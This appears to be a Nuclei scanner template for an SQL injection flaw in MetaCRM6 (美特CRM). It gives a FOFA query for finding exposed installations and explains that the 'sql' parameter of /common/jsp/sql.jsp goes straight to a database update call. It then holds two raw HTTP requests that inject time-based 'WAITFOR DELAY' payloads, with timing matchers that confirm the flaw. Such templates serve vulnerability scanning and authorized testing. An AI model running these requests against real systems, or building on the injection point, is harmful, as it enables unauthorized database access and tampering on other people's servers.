id: metacrm-sqljsp-sqli
info:
  name: 美特CRM sql.jsp 文件 SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="MetaCRM6客户关系管理系统"
          该漏洞源于webapps\common\jsp\sql.jsp文件中参数sql的处理逻辑存在缺陷，用户输入在第三行接收后，未经充分验证直接传递至第五行的dbm.update(sql)方法，导致攻击者可通过构造恶意SQL语句实现注入攻击。
  tags: 美特CRM
http:
- raw:
  - |
    GET /common/jsp/sql.jsp?sql=;WAITFOR DELAY '0:0:5'- HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close
  - |
    GET /common/jsp/sql.jsp?sql=;WAITFOR DELAY '0:0:8'- HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
